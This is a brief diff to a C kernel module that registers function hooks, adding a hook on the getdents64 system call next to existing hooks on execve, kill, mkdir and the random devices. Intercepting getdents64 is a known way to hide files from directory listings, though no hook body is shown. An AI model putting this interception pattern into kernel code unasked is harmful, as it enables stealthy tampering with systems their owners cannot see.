@@ -1,4 +1,5 @@
 #include "execve.h"
+#include "getdents.h"
 #include "hook.h"
 #include "kill.h"
 #include "mkdir.h"
@@ -25,6 +26,10 @@ struct hook hooks[] = {
 
     { .name = "random_read", .func = random_read_hook, .orig_ptr = (void **)&random_read_orig },
     { .name = "urandom_read", .func = urandom_read_hook, .orig_ptr = (void **)&urandom_read_orig },
+
+    // getdents64 (struct linux_dirent64) supports large filesystems and large file offsets
+    // TODO Is getdents support even needed?
+    { .name = "__x64_sys_getdents64", .func = getdents64_hook, .orig_ptr = (void **)&getdents64_orig },
 };
 
 static int __init init(void) {
